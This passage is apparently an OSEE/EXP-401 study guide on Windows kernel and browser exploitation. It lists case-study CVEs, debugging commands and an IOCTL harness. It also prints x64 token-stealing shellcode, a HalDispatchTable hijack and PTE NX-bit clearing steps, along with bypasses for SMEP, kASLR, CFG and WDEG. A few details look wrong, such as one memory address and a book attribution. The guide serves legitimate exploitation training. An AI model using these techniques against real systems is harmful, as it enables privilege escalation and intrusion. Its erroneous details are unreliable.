EXP-401 uses real-world vulnerabilities in large enterprise applications as case studies. While OffSec does not publicly disclose the specific CVEs used in each iteration of the course (they are updated regularly), the following CVEs and vulnerability classes are representative of what has been covered or is closely aligned with the course material:

### Browser and User-Mode Case Studies

| CVE | Target | Bug Class | Exploitation Technique |
|-----|--------|-----------|----------------------|
| CVE-2019-0539 | Microsoft Edge (Chakra) | Type Confusion | JIT type confusion, fake object construction, arbitrary read/write via corrupted ArrayBuffer |
| CVE-2019-1208 | Internet Explorer (VBScript) | UAF | VBScript engine UAF, heap spray with typed arrays, code execution via vftable hijack |
| CVE-2020-0674 | Internet Explorer (JScript) | UAF | JScript variable UAF, controlled reallocation, info leak + code exec |
| CVE-2021-26411 | Internet Explorer | UAF (double-free) | Use in attributed string handling, reclaim with controlled data |
| CVE-2021-40449 | Win32k (MysterySnail) | UAF | Win32k callback mechanism UAF, privilege escalation |

### Kernel-Mode Case Studies

| CVE | Target | Bug Class | Exploitation Technique |
|-----|--------|-----------|----------------------|
| CVE-2016-7255 | Win32k (tagWND) | Pool Overflow | Window object pool corruption, arbitrary write via `SetWindowLong` |
| CVE-2019-0808 | Win32k | NULL pointer deref | Win32k NULL page dereference after failed object creation |
| CVE-2020-0986 | splwow64 | Arbitrary pointer deref | Exploited by DarkHotel APT; arbitrary read/write via printer driver |
| CVE-2020-17087 | Windows Kernel (cng.sys) | Pool Overflow | Integer truncation in CNG key derivation leading to pool overflow |
| CVE-2021-1732 | Win32k (xxxClientAllocWindowClassExtraBytes) | UAF/OOB | Callout during window class extra bytes allocation; corrupts tagWND field |
| CVE-2021-21224 + CVE-2021-31956 | Chrome + NTFS | Type confusion + Pool overflow | Chrome V8 type confusion chained with NTFS pool overflow for sandbox escape |
| CVE-2021-31955 | Windows Kernel | Information Disclosure | NtQuerySystemInformation leak of kernel addresses used for kASLR bypass |
| CVE-2022-21882 | Win32k | Type Confusion | Win32k `CreateWindow` type confusion via menu object manipulation |
| CVE-2023-36802 | MSKSSRV.sys | Pool overflow | Microsoft Kernel Streaming Server driver pool overflow, privilege escalation |
| CVE-2024-21338 | appid.sys (AppLocker) | Logic bug | AppLocker driver IOCTL allowing arbitrary kernel read/write |

### Course-Specific Focus Areas

The AWE course is known to deeply analyze:

1. **VMware Workstation escapes**: Guest-to-host exploitation via SVGA, XHCI, or shared folder vulnerabilities
2. **Browser + kernel chains**: Combining a browser RCE (e.g., Chakra/V8 type confusion) with a kernel LPE (e.g., Win32k UAF) for full sandbox escape
3. **Enterprise software**: Vulnerabilities in products like Microsoft Exchange, SMB, or PDF readers deployed on enterprise networks
4. **WDEG/CFG bypass**: Techniques to defeat Windows Defender Exploit Guard mitigations including Control Flow Guard, Arbitrary Code Guard, and Export Address Filtering

### Dissection Methodology

For each case study, the course follows a rigorous methodology:

```
1. Root Cause Analysis
   - Identify the vulnerable function and the specific coding error
   - Classify the bug (UAF, pool overflow, type confusion, etc.)
   - Determine the affected Windows versions

2. Trigger Development
   - Write minimal PoC code that reaches the vulnerable code path
   - Identify IOCTL codes, syscall parameters, or user interaction required
   - Confirm the crash/behavior in WinDbg

3. Primitive Construction
   - Analyze what the bug allows (read, write, execute, info leak)
   - Determine constraints (size, alignment, timing, pool type)
   - Design the exploitation strategy

4. Exploit Development
   - Pool grooming / heap shaping
   - Mitigation bypass (kASLR, SMEP, DEP, CFG)
   - Shellcode deployment or data-only attack
   - Privilege escalation (token steal, privilege manipulation)

5. Reliability Engineering
   - Handle edge cases and failed grooming attempts
   - Add retry logic for race conditions
   - Test across Windows builds for version independence
```

---

## 5. Tools of the Trade

### 5.1 WinDbg

WinDbg is the primary debugging tool used throughout the course for both user-mode and kernel-mode analysis.

#### Kernel Debugging Setup

```
# Host (debugger) connects to VM (debuggee) via named pipe or network
bcdedit /debug on
bcdedit /dbgsettings net hostip:<IP> port:<PORT> key:<KEY>

# Or via serial (COM port):
bcdedit /dbgsettings serial debugport:1 baudrate:115200
```

#### Essential Commands for Exploit Development

```
# Pool analysis
!pool <address>           - Display pool information for an address
!poolused 2               - Show pool usage sorted by tag
!poolfind <tag>           - Find all pool allocations with a given tag
!poolval                  - Validate pool headers

# Object inspection
dt nt!_EPROCESS <addr>    - Dump EPROCESS structure
dt nt!_TOKEN <addr>       - Dump TOKEN structure
dt nt!_POOL_HEADER <addr> - Dump pool header
!object <addr>            - Display object manager information
!handle <handle>          - Show handle table entry

# Memory and PTE analysis
!pte <virtual_address>    - Display PTE for a virtual address
!vtop <dirbase> <va>      - Virtual to physical translation
!pfn <pfn>                - Display physical page information
dc/dq/db <addr>           - Display memory (dword/qword/byte)
s -b <start> L<len> <pattern> - Search memory for byte pattern

# Execution and breakpoints
bp <addr>                 - Set breakpoint
ba w8 <addr>              - Set hardware write watchpoint (8 bytes)
bl                        - List breakpoints
g                         - Continue execution
t / p                     - Step into / Step over
gu                        - Go up (execute until return)

# Stack and code analysis
k / kv / kp               - Stack backtrace (various detail levels)
u <addr>                  - Unassemble at address
uf <function>             - Unassemble entire function
.reload /f                - Force reload all symbols
lm                        - List loaded modules

# Process and thread
!process 0 0              - List all processes
!process <addr> 7         - Detailed process info
!thread <addr>            - Display thread info
.process /i <addr>        - Switch to process context (invasive)
```

#### WinDbg Scripting (JavaScript)

WinDbg supports JavaScript extensions for automation:

```javascript
"use strict";

function findSystemToken() {
    let systemProc = host.namespace.Debugger.Utility.Control.ExecuteCommand(
        '!process 0 0 System'
    );
    // Parse output to find token address
    // ...
}
```

### 5.2 IDA Pro

IDA Pro is the primary static analysis tool for reverse engineering drivers and applications.

#### Key Uses in AWE

- **Driver IOCTL handler mapping**: Trace `IRP_MJ_DEVICE_CONTROL` dispatch to map all IOCTL codes to their handlers
- **Pool allocation analysis**: Find all calls to `ExAllocatePoolWithTag` / `ExAllocatePool2`, annotate allocation sizes, pool types, and tags
- **Vulnerability discovery**: Identify missing bounds checks, integer overflows, type confusion patterns
- **Cross-reference analysis**: Trace data flow from user input to kernel operations
- **Structure reconstruction**: Recreate C structures from assembly patterns

#### Techniques

```
# Finding IOCTL handlers:
1. Locate DriverEntry -> MajorFunction[IRP_MJ_DEVICE_CONTROL] assignment
2. Follow the dispatch function
3. Map switch/case on IoControlCode values
4. Annotate each handler with its IOCTL code and parameters

# Identifying pool operations:
1. Search for imports: ExAllocatePoolWithTag, ExAllocatePool2
2. For each call site, note:
   - Pool type (1st argument)
   - Allocation size (2nd argument) -- is it constant or user-controlled?
   - Pool tag (3rd argument)
3. Cross-reference with ExFreePoolWithTag calls for UAF analysis

# Type reconstruction:
1. Identify structure access patterns in assembly
2. Use IDA's "Create struct" to define types
3. Apply struct types to function arguments for better decompilation
```

### 5.3 x64dbg

x64dbg serves as a complementary user-mode debugger:

- **User-mode exploit debugging**: Debug exploit scripts and user-mode components
- **API hooking analysis**: Monitor calls to `DeviceIoControl`, `NtAllocateVirtualMemory`, etc.
- **Heap visualization**: Inspect user-mode heap state during exploit development
- **Scripting**: Python-based automation for repetitive analysis tasks

### 5.4 Python Scripting

Python is the primary scripting language for exploit development in the course:

#### ctypes for Windows API Interaction

```python
import ctypes
from ctypes import wintypes

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

# Open device handle
hDevice = kernel32.CreateFileW(
    "\\\\.\\VulnerableDriver",
    0xC0000000,  # GENERIC_READ | GENERIC_WRITE
    0, None, 3,  # OPEN_EXISTING
    0, None
)

# Send IOCTL
inputBuf = ctypes.create_string_buffer(b"\x41" * 0x100)
outputBuf = ctypes.create_string_buffer(0x100)
bytesReturned = wintypes.DWORD()

kernel32.DeviceIoControl(
    hDevice,
    0x0022204f,  # IOCTL code
    inputBuf, len(inputBuf),
    outputBuf, len(outputBuf),
    ctypes.byref(bytesReturned),
    None
)
```

#### struct Module for Binary Data Manipulation

```python
import struct

# Pack exploit payload
payload = b""
payload += struct.pack("<Q", 0x6b63614802020000)  # Fake _POOL_HEADER
payload += struct.pack("<Q", target_address)        # Corrupted Name pointer
payload += b"\x90" * 8                              # Padding

# Unpack leaked kernel address
leaked_addr = struct.unpack("<Q", outputBuf[0x70:0x78])[0]
kernel_base = leaked_addr - known_offset
```

#### Automation Framework

```python
class KernelExploit:
    def __init__(self, device_path):
        self.hDevice = self._open_device(device_path)
        self.kernel_base = None
        self.hevd_base = None

    def info_leak(self):
        """Stage 1: Bypass kASLR via OOB read"""
        self._spray_events(5000)
        self._poke_holes()
        self._spray_uaf_objects(2500)
        self._trigger_oob_read()
        self._parse_leaked_addresses()

    def pool_overflow(self):
        """Stage 2: Corrupt adjacent object for arb r/w"""
        self._groom_pool()
        self._trigger_overflow()
        self._identify_corrupted_object()

    def escalate_privileges(self):
        """Stage 3: Token steal or PTE corruption"""
        self._arbitrary_read(self.target_addr)
        self._arbitrary_write(self.target_addr, self.payload)
```

---

## 6. Shellcoding Techniques

### 6.1 Kernel-Mode Shellcode Fundamentals

Kernel shellcode differs from user-mode shellcode in several critical ways:

- **No user-mode API access**: Cannot call `LoadLibrary`, `GetProcAddress`, etc.
- **Must not crash the system**: Any unhandled exception causes a BSOD
- **Must be privilege-level aware**: Runs at Ring 0 with full system access
- **Must handle interrupts**: Cannot disable interrupts for extended periods
- **Must restore state**: Must preserve and restore kernel state to prevent instability

### 6.2 Token-Stealing Shellcode

The most common kernel shellcode pattern taught in the course:

```asm
; x64 Token Stealing Shellcode
; Copies SYSTEM token to current process

[BITS 64]

start:
    ; Get current _KTHREAD from GS segment
    mov rax, [gs:0x188]         ; _KPCR.PrcbData.CurrentThread

    ; Get current _EPROCESS from _KTHREAD
    mov rax, [rax + 0xB8]       ; _KTHREAD.ApcState.Process (offset varies by build)

    ; Save current process EPROCESS
    mov rcx, rax

find_system:
    ; Walk ActiveProcessLinks to find SYSTEM (PID 4)
    mov rax, [rax + 0x448]      ; _EPROCESS.ActiveProcessLinks.Flink
    sub rax, 0x448              ; Adjust back to start of _EPROCESS
    cmp dword [rax + 0x440], 4  ; _EPROCESS.UniqueProcessId == 4?
    jne find_system

    ; Copy SYSTEM token to current process
    mov rdx, [rax + 0x4B8]     ; SYSTEM _EPROCESS.Token
    and rdx, 0xFFFFFFFFFFFFFFF0 ; Clear reference count bits
    mov [rcx + 0x4B8], rdx     ; Overwrite current process token

    ; Return cleanly
    xor rax, rax                ; STATUS_SUCCESS
    ret
```

**Important**: Structure offsets are build-specific. The course teaches techniques for making shellcode version-independent.

### 6.3 Version-Independent Techniques

Since kernel structure offsets change between Windows builds, the course teaches several approaches:

1. **Runtime offset resolution**: Read version information from `KUSER_SHARED_DATA` (mapped at a fixed address) and select offsets from a lookup table
2. **Signature scanning**: Search for known byte patterns near target fields
3. **Relative offset calculation**: Use known, stable offsets as anchors and calculate target offsets relative to them
4. **PEB/TEB traversal**: Use documented, stable fields to bootstrap access to version-specific structures

```asm
; Version-independent token offset resolution
; KUSER_SHARED_DATA at 0xFFFFF78000000000
mov rax, 0xFFFFF78000000000
movzx ecx, word [rax + 0x26C]   ; NtMajorVersion
movzx edx, word [rax + 0x270]   ; NtMinorVersion  (documented, stable)
mov r8d, dword [rax + 0x260]    ; NtBuildNumber

; Select offsets based on build number
cmp r8d, 19041                   ; Windows 10 2004
je .offsets_2004
cmp r8d, 22621                   ; Windows 11 22H2
je .offsets_22h2
; ... fallback / error
```

### 6.4 KUSER_SHARED_DATA as Shellcode Staging Area

`KUSER_SHARED_DATA` is mapped at a known, fixed virtual address in both user mode and kernel mode:

- User mode: `0x7FFE0000000` (read-only)
- Kernel mode: `0xFFFFF78000000000` (read-write)

The region at offset `+0x800` is typically unused and writable from kernel mode, making it a popular shellcode staging area:

```
1. Use arbitrary write primitive to write shellcode QWORD-by-QWORD to
   KUSER_SHARED_DATA + 0x800 (0xFFFFF78000000800)
2. Read the PTE for this address
3. Clear the NX bit in the PTE (bit 63)
4. Write the modified PTE back
5. The page is now RWX
6. Redirect execution to 0xFFFFF78000000800
```

### 6.5 Shellcode Execution Triggers

After placing shellcode in executable memory, it must be triggered:

**HalDispatchTable hijack:**
```
1. Read original [nt!HalDispatchTable + 0x8] value (preserve for restoration)
2. Overwrite [nt!HalDispatchTable + 0x8] with shellcode address
3. Call NtQueryIntervalProfile(ProfileTotalIssues, &interval)
   - This internally calls KeQueryIntervalProfile
   - Which calls HalDispatchTable[1] (our shellcode)
4. Restore original HalDispatchTable entry for stability
```

**Other triggers:**
- `NtGdiDdDDINetDispGetNextChunkInfo` (for GDI-based primitives)
- Window procedure callbacks (for Win32k exploits)
- Worker routine invocation (for IRP-based exploits)

---

## 7. Mitigation Bypass Techniques

### 7.1 Kernel Address Space Layout Randomization (kASLR)

**What it does**: Randomizes the load address of ntoskrnl.exe and other kernel modules on each boot.

**Bypass techniques taught in the course**:

| Technique | Method | Applicability |
|-----------|--------|---------------|
| NtQuerySystemInformation | SystemModuleInformation class returns kernel base | Medium integrity (not from sandboxes) |
| EnumDeviceDrivers | Returns base addresses of loaded drivers | Medium integrity (not from sandboxes) |
| GDI object leak (pre-RS3) | GDI shared handle table leaks kernel addresses | Legacy -- patched in RS3 |
| Pool OOB read | Out-of-bounds read discloses adjacent pool contents containing kernel pointers | Low integrity -- primary modern technique |
| Side-channel attacks | Prefetch/TSX/speculative execution | Hardware-dependent, mostly patched |
| Exception-based disclosure | Kernel exception records containing kernel addresses | Specific vulnerability-dependent |

### 7.2 Supervisor Mode Execution Prevention (SMEP)

**What it does**: CPU feature that prevents Ring 0 from executing code in user-mode pages (pages with the U/S bit set in PTE).

**Bypass techniques**:

1. **PTE corruption**: Flip the U/S bit in the PTE of a user-mode page containing shellcode from User (1) to Supervisor (0), making it appear as a kernel page
2. **ROP to disable SMEP**: Chain gadgets to modify CR4 (clear bit 20) -- but modern Windows validates CR4 modifications
3. **Kernel-mode code caves**: Write shellcode to writable kernel memory (KUSER_SHARED_DATA+0x800) and make it executable via PTE manipulation
4. **Data-only attacks**: Avoid code execution entirely by manipulating kernel data structures

### 7.3 Kernel Data Execution Prevention (DEP/NX)

**What it does**: Non-executable pages in kernel address space prevent code execution from data regions.

**Bypass techniques**:

1. **PTE NX bit clearing**: Use arbitrary write to clear bit 63 of the PTE for the shellcode page
2. **ROP chains**: Chain existing kernel gadgets to perform operations without injecting code
3. **Repurpose existing executable memory**: Find writable + executable kernel regions (rare in modern Windows)

### 7.4 Kernel Control Flow Guard (kCFG)

**What it does**: Validates indirect call targets against a bitmap of valid function entry points. Invalid targets cause a fast-fail exception.

**Bypass techniques**:

1. **Call valid functions with controlled arguments**: Instead of hijacking to shellcode, redirect to a legitimate function that achieves the desired effect when called with specific arguments
2. **Return-oriented programming**: ROP does not use indirect calls, bypassing CFG
3. **Corrupt the CFG bitmap**: If you have an arbitrary write, mark your shellcode address as a valid call target
4. **JIT page exploitation**: JIT compilers may create new executable pages that are marked as valid CFG targets

### 7.5 Virtualization-Based Security (VBS) and HVCI

**What it does**: Uses the hypervisor to enforce code integrity. Kernel-mode code pages cannot be made writable (W^X enforcement at the hypervisor level). New executable pages cannot be created without valid signatures.

**Implications for exploitation**:

- PTE corruption for NX bypass **does not work** -- the hypervisor prevents changing page permissions
- `KUSER_SHARED_DATA+0x800` technique **does not work** -- HVCI prevents executing from data pages
- **Data-only attacks become mandatory**: Token stealing, privilege manipulation, security descriptor corruption
- **ROP becomes the primary code execution mechanism** (where code execution is needed)

### 7.6 Windows Defender Exploit Guard (WDEG)

The course specifically covers disarming WDEG mitigations:

| Mitigation | Description | Bypass Approach |
|-----------|-------------|-----------------|
| Arbitrary Code Guard (ACG) | Prevents dynamic code generation | Use existing code (ROP), or attack processes without ACG |
| Control Flow Guard (CFG) | Validates indirect calls | ROP, bitmap corruption, valid-target redirection |
| Export Address Filtering (EAF) | Detects reads from export tables | Indirect reads, copying export data, hook-based resolution |
| Import Address Filtering (IAF) | Detects reads from import tables | Similar to EAF bypass |
| Block low integrity images | Prevents loading DLLs from low-integrity paths | Exploit higher-integrity process, or use in-memory techniques |

---

## 8. Bridging Theory and Real-World Exploitation

### 8.1 The AWE Pedagogy

EXP-401's pedagogical approach is distinctive in how it bridges theoretical knowledge with practical exploitation skill:

#### Day-by-Day Progression (Approximate)

| Day | Focus | Key Concepts |
|-----|-------|-------------|
| 1 | User-mode mitigation bypass | DEP/ASLR/CFG bypass, advanced ROP, JIT spray |
| 2 | Heap exploitation and primitives | Type confusion, UAF, heap shaping, arbitrary read/write construction |
| 3 | Kernel pool exploitation | Segment heap internals, kLFH grooming, pool overflow techniques |
| 4 | Kernel mitigation bypass | SMEP/kASLR/DEP bypass, PTE corruption, token stealing |
| 5 | Advanced topics and integration | VBS/HVCI considerations, full exploit chains, version independence |

Each day includes:
- **Theory lecture**: Detailed explanation of the underlying Windows internals
- **Guided walkthrough**: Instructor-led exploitation of a known CVE
- **Hands-on lab**: Students develop their own exploits against provided targets
- **Evening reading**: Case studies and research papers for the next day

### 8.2 From Crash to Exploit

The course teaches a systematic methodology for turning a crash report into a reliable exploit:

```
Phase 1: Triage
  - Reproduce the crash
  - Identify the bug class (UAF, overflow, type confusion, etc.)
  - Determine the root cause at the source code level

Phase 2: Primitive Assessment
  - What memory can be corrupted?
  - How much control do we have over the corruption?
  - What timing constraints exist?
  - Can we trigger the bug multiple times?

Phase 3: Environment Mapping
  - What mitigations are active? (kASLR, SMEP, CFG, VBS, HVCI)
  - What pool type and size is involved?
  - What Windows build is targeted?
  - What integrity level do we start from?

Phase 4: Strategy Selection
  - Choose target objects for pool grooming
  - Select primitive construction technique
  - Plan mitigation bypass chain
  - Design shellcode or data-only attack

Phase 5: Implementation
  - Write the exploit (Python + C)
  - Implement pool grooming
  - Build shellcode with version-independent offsets
  - Add error handling and reliability measures

Phase 6: Testing and Hardening
  - Test on multiple Windows builds
  - Measure success rate
  - Add fallback strategies for failed grooming
  - Clean up kernel state after exploitation
```

### 8.3 Version Independence

A key AWE teaching point is building exploits that work across multiple Windows builds:

1. **Offset tables**: Maintain lookup tables mapping build numbers to structure offsets
2. **Runtime probing**: Read `KUSER_SHARED_DATA.NtBuildNumber` to select correct offsets
3. **Signature-based resolution**: Scan kernel memory for known patterns to locate structures
4. **Minimal assumption design**: Use stable, documented interfaces where possible
5. **WDEG disarming**: Dynamically detect and bypass active WDEG policies

### 8.4 Why This Matters in the Real World

The skills taught in EXP-401 directly apply to:

- **Vulnerability research**: Finding and triaging 0-day vulnerabilities in Windows kernel components and drivers
- **Red team operations**: Developing custom kernel exploits for privilege escalation in enterprise environments
- **Defensive analysis**: Understanding exploitation techniques enables better detection engineering, threat hunting, and mitigation validation
- **Incident response**: Analyzing kernel-level rootkits and exploit artifacts in compromised systems
- **Software security review**: Auditing kernel-mode drivers for exploitable vulnerability classes

---

## 9. Exam Structure and Expectations

### Format

- **Duration**: 71 hours and 45 minutes (approximately 72 hours)
- **Environment**: Remote virtual lab accessed via VPN from Kali Linux
- **Targets**: Multiple target machines with unknown vulnerabilities
- **Documentation deadline**: 24 hours after exam ends
- **Proctored**: Yes, with webcam monitoring throughout
- **Passing score**: 75 out of 100 points
- **Scoring**: Two assignments, each worth 25 points (partial) or 50 points (full completion)

### What is Expected

Students must:

1. **Discover vulnerabilities** in unknown target software (no known CVE identifiers provided)
2. **Develop working exploits** that achieve code execution or privilege escalation
3. **Bypass active mitigations** present on the target machines
4. **Document every step** including:
   - Vulnerability analysis and root cause
   - Exploitation strategy and rationale
   - Full exploit code (must be reproducible)
   - Screenshots of every significant step
   - Proof files (`proof.txt` from Administrator desktop)

### Key Differences from Other OffSec Exams

| Aspect | OSCP | OSED | OSEE |
|--------|------|------|------|
| Duration | 24 hours | 48 hours | ~72 hours |
| Focus | Network pentesting | User-mode exploit dev | Advanced Windows exploitation |
| Targets | Multiple machines | Specific applications | Unknown vulnerabilities |
| Exploit type | Mostly known vulns | User-mode custom exploits | Kernel + user-mode chains |
| Mitigation bypass | Basic | DEP/ASLR/SEH | SMEP/kASLR/CFG/WDEG/VBS |
| Documentation | Standard report | Detailed with code | Extremely detailed with reproducible code |

### Preparation Recommendations

- Complete EXP-301 (OSED) first
- Study Windows internals deeply: "Windows Internals" by Russinovich et al. is essential
- Practice kernel debugging with WinDbg extensively
- Work through HEVD (HackSys Extreme Vulnerable Driver) exercises
- Read published exploit analyses for recent Windows kernel CVEs
- Build a lab environment with multiple Windows builds for testing

---

## 10. References and Further Reading

### Books

- Russinovich, M., Solomon, D., Ionescu, A. *Windows Internals, Part 1 & 2* (7th Edition). Microsoft Press.
- Yason, M. *The Art of Memory Forensics*. Wiley.
- Anley, C. et al. *The Shellcoder's Handbook*. Wiley.

### Research Papers and Articles

- Bayet, C., Fariello, P. "Pool Overflow Exploitation Since Windows 10 19H1." SSTIC 2020.
- Shafir, Y. "Windows Heap-Backed Pool: The Good, The Bad, and The Encoded." BlackHat USA 2021.
- McGarr, C. "Swimming In The (Kernel) Pool - Leveraging Pool Vulnerabilities From Low-Integrity Exploits." 2021.
- Blue Frost Security. "Abusing GDI for Ring0 Exploit Primitives: Evolution." 2017.
- Mandt, T. "Kernel Pool Exploitation on Windows 7." BlackHat DC 2011.
- NCC Group. Annual Cyber Security Research Reports (Windows kernel exploitation research). 2020-2025.
- Jurczyk, M. "One font vulnerability to rule them all." Google Project Zero, 2015.

### Training Resources

- HackSys Extreme Vulnerable Driver (HEVD): https://github.com/hacksysteam/HackSysExtremeVulnerableDriver
- OffSec EXP-401 Syllabus: https://www.offsec.com/awe/EXP401_syllabus.pdf
- OSEE Exam Guide: https://help.offsec.com/hc/en-us/articles/360046458732
- OffSec EXP-401 FAQ: https://help.offsec.com/hc/en-us/articles/25190559024276

### Tools

- WinDbg (Windows Debugger): Part of Windows SDK / WinDbg Preview from Microsoft Store
- IDA Pro: https://hex-rays.com/ida-pro/
- x64dbg: https://x64dbg.com/
- ROPgadget: https://github.com/JonathanSalwan/ROPgadget
- Python 3 with ctypes, struct, and pykd modules
- VirtualKD / KDNET for fast kernel debugging over network

---

*This document was compiled for OSEE certification preparation. The techniques described are intended for authorized security research and educational purposes only. Unauthorized exploitation of computer systems is illegal.*
